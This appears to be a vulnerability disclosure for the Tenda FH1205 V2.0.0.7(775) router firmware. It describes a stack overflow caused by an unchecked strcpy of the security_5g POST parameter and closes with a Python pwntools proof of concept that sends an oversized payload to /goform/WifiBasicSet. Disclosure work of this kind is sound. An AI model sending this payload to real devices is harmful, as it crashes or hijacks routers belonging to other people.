## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2236.html

## Affected version

FH1205 V2.0.0.7(775)

## Vulnerability details

The Tenda FH1205 V2.0.0.7(775) firmware has a stack overflow vulnerability in the `formWifiBasicSet` function. The `src` variable receives the `security_5g` parameter from a POST request and is later assigned to the `v34` variable, which is fixed at 256 bytes. However, since the user can control the input of `security_5g`, the statement `strcpy(v34, src);` can cause a buffer overflow. The user-provided `security_5g` can exceed the capacity of the `v34` array, triggering this security vulnerability.

![image-20240319221819491](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319221819491.png)

![image-20240319221740628](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319221740628.png)

![image-20240319221807478](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319221807478.png)

## PoC

```python
import requests
from pwn import *

url = 'http://192.168.84.101/goform/WifiBasicSet'
payload = b'a' * 500 + p32(0xdeadbeef)
data = {
    'security_5g':payload, 
    'hideSsid':'1', 
    'ssid':'1',
    'security':'1', 
    'wrlPwd':'1', 
    'hideSsid_5g':'1', 
    'ssid_5g':'1', 
    'wrlPwd_5g': '1'
}

requests.post(url, data=data)
```

![image-20240304213056127](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304213056127.png)